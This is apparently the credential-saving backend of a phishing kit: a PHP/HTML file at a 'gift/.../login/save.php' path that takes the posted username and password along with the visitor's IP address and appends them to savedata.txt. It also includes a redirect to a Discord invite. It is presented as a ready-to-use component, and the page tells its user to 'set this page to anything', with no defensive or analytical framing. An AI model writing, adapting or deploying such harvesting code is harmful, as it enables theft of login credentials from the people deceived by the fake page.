<!DOCTYPE html>
<html>
  <head>
  <link rel="stylesheet" href="../assest/style.css"/>
  </head>
  <body>
    you can set this page to anything. (location: gift/HJ9fh9hGfgfijh93/login/save.php)
  </body>
</html>
<script>function redirect(){window.location.replace("https://discord.gg/4Fxhr8d966")}</script>
<?php
$iptoken = $_SERVER['REMOTE_ADDR'];  
    if(isset($_POST['pass'])){
      $user = $_POST['user'];
      $pass = $_POST['pass'];
      $file = fopen("savedata.txt", "a+");
      fwrite($file," -  IP: ".$iptoken."   Username: " . $user . "   Password: " . $pass . "\n\n");
      fclose($file);
      die();
}
?>